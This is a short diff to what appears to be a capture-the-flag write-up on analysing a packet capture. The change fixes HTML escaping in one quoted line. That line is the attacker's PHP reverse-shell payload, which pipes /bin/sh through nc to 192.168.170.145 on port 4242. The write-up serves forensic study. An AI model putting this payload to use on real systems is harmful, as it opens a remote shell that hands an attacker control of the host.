@@ -23,7 +23,7 @@ On close observation, you will find that the page is ```/development/```
 ![](/images/Mars/overpass2.png)
 
 When we followed the TCP stream of the packet with /development/uploads.php and found the above. Hence, the payload the attacker used was 
-```&lt;?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?```
+```<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>```
 
 **What password did the attacker use to privesc?**
 
